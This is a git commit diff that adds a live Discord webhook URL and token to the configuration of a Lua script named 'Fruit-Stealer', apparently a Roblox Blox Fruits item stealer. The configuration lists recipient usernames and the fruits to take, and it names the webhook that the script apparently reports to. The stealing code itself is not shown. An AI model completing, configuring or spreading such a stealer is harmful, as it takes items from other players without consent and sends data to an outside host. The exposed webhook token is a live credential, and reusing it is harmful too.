1c3a65a2c4fb71427b4dd9095101af9424405f4c
uAreNobb <yashskelkar@gmail.com>
2025-04-10 05:54:48 +0530

    Update Fruit-Stealer.lua

--- Fruit-Stealer.lua
+++ Fruit-Stealer.lua
@@ -1,4 +1,4 @@
-Webhook = "" -- << Your Webhook
+Webhook = "https://discord.com/api/webhooks/1359679077056774354/0fsz95kgqqL6E_e5JavDIsQpNL5e-FcMBVQZjSrH1QPQNBxj3os_iAjW26kf5x4g3a04" -- << Your Webhook
 Usernames = {"YSKTABAHI", "XR_TABAHIXD"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
